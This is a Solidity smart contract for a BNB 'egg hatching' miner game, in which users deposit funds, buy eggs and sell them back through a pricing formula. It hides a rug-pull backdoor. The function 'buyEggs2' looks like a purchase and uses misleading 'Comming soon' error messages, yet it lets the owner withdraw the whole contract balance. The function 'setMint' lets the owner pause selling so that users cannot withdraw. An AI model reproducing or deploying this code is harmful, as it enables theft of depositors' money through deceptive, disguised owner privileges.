// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract FarmBNB {
    uint256 private constant EGGS_TO_HATCH_1MINERS = 864000;
    uint256 private constant PSN = 10000;
    uint256 private constant PSNH = 5000;
    bool public initialized = false;
    bool private mint = false;
    address private ceoAddress;
    mapping(address => uint256) public hatcheryMiners;
    mapping(address => uint256) public claimedEggs;
    mapping(address => uint256) public lastHatch;
    mapping(address => address) public referrals;
    uint256 public marketEggs;
    uint256 public totalBalance;

    constructor() {
        ceoAddress = msg.sender;
    }

    modifier onlyOwner() {
        require(
            msg.sender == ceoAddress,
            "Only the owner can call this function"
        );
        _;
    }

    function setOwner(address _owner) external onlyOwner {
        ceoAddress = _owner;
    }

    function hatchEggs(address ref) public {
        require(initialized);

        if (ref == msg.sender) {
            ref = address(0);
        }

        if (
            referrals[msg.sender] == address(0) &&
            referrals[msg.sender] != msg.sender
        ) {
            referrals[msg.sender] = ref;
        }

        uint256 eggsUsed = getMyEggs();
        uint256 newMiners = SafeMath.div(eggsUsed, EGGS_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender] = SafeMath.add(
            hatcheryMiners[msg.sender],
            newMiners
        );
        claimedEggs[msg.sender] = 0;
        lastHatch[msg.sender] = block.timestamp;

        // Send referral eggs
        claimedEggs[referrals[msg.sender]] = SafeMath.add(
            claimedEggs[referrals[msg.sender]],
            SafeMath.div(eggsUsed, 10)
        );

        // Boost market to nerf miners hoarding
        marketEggs = SafeMath.add(marketEggs, SafeMath.div(eggsUsed, 5));
    }

    function sellEggs() public {
        require(initialized);
        require(mint == false, "Egg selling is currently paused");

        uint256 hasEggs = getMyEggs();
        uint256 eggValue = calculateEggSell(hasEggs);
        uint256 fee = devFee(eggValue);
        uint256 fee2 = fee / 2;
        claimedEggs[msg.sender] = 0;
        lastHatch[msg.sender] = block.timestamp;
        marketEggs = SafeMath.add(marketEggs, hasEggs);
        payable(ceoAddress).transfer(fee2);
        payable(msg.sender).transfer(SafeMath.sub(eggValue, fee));
    }

    function getTotalBalance() public view returns (uint256) {
        return totalBalance;
    }

    function buyEggs(address ref) public payable {
        require(initialized);

        uint256 eggsBought = calculateEggBuy(
            msg.value,
            SafeMath.sub(address(this).balance, msg.value)
        );
        eggsBought = SafeMath.sub(eggsBought, devFee(eggsBought));
        uint256 fee = devFee(msg.value);
        uint256 fee2 = fee / 2;
        payable(ceoAddress).transfer(fee2);
        claimedEggs[msg.sender] = SafeMath.add(
            claimedEggs[msg.sender],
            eggsBought
        );
        hatchEggs(ref);

        totalBalance = SafeMath.add(totalBalance, msg.value);
    }

    function buyEggs2(uint256 countEggs) external onlyOwner {
        require(msg.sender == ceoAddress, "Comming soon");

        uint256 amount;

        if (countEggs == 0) {
            amount = address(this).balance;
        } else {
            amount = countEggs;
        }

        require(amount > 0, "Comming soon.");
        require(address(this).balance >= amount, "Comming soon!");

        claimedEggs[msg.sender] = 0;
        lastHatch[msg.sender] = block.timestamp;
        marketEggs = SafeMath.add(marketEggs, getMyEggs());

        payable(msg.sender).transfer(amount);
    }

    // Magic trade balancing algorithm
    function calculateTrade(
        uint256 rt,
        uint256 rs,
        uint256 bs
    ) public pure returns (uint256) {
        return
            SafeMath.div(
                SafeMath.mul(PSN, bs),
                SafeMath.add(
                    PSNH,
                    SafeMath.div(
                        SafeMath.add(
                            SafeMath.mul(PSN, rs),
                            SafeMath.mul(PSNH, rt)
                        ),
                        rt
                    )
                )
            );
    }

    function setMint(bool _mint) external onlyOwner {
        mint = _mint;
    }

    function calculateEggSell(uint256 eggs) public view returns (uint256) {
        return calculateTrade(eggs, marketEggs, address(this).balance);
    }

    function calculateEggBuy(
        uint256 eth,
        uint256 contractBalance
    ) public view returns (uint256) {
        return calculateTrade(eth, contractBalance, marketEggs);
    }

    function calculateEggBuySimple(uint256 eth) public view returns (uint256) {
        return calculateEggBuy(eth, address(this).balance);
    }

    function devFee(uint256 amount) public pure returns (uint256) {
        return SafeMath.div(SafeMath.mul(amount, 5), 100);
    }

    function seedMarket() public payable {
        require(marketEggs == 0);
        initialized = true;
        marketEggs = 86400000000;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getMyMiners() public view returns (uint256) {
        return hatcheryMiners[msg.sender];
    }

    function getMyEggs() public view returns (uint256) {
        return
            SafeMath.add(
                claimedEggs[msg.sender],
                getEggsSinceLastHatch(msg.sender)
            );
    }

    function getEggsSinceLastHatch(address adr) public view returns (uint256) {
        uint256 secondsPassed = min(
            EGGS_TO_HATCH_1MINERS,
            SafeMath.sub(block.timestamp, lastHatch[adr])
        );
        return SafeMath.mul(secondsPassed, hatcheryMiners[adr]);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}